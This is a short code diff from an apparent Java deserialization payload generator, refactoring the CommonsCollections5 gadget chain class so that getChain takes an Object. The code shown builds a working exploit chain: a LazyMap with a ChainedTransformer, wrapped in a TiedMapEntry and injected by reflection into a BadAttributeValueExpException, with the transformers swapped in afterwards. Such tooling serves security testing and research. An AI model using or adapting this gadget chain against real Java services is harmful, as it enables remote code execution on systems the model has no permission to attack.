@@ -34,18 +34,19 @@ public class CommonsCollections5 implements ObjectPayload<Object> {
         // sink
         Object sinkObject = SinkScheduler.builder(sinksHelper);
 
-        Object kickOffObject = getChain((Transformer[]) sinkObject);
+        Object kickOffObject = getChain(sinkObject);
 
         return kickOffObject;
     }
 
-    public Object getChain(Transformer[] transformers) throws Exception {
+    public Object getChain(Object transformers) throws Exception {
         final Transformer transformerChain = new ChainedTransformer(
                 new Transformer[]{new ConstantTransformer(1)});
 
         final Map innerMap = new HashMap();
         final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
         TiedMapEntry entry = new TiedMapEntry(lazyMap, "x");
+
         BadAttributeValueExpException val = new BadAttributeValueExpException(null);
         Reflections.setFieldValue(val, "val", entry);
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
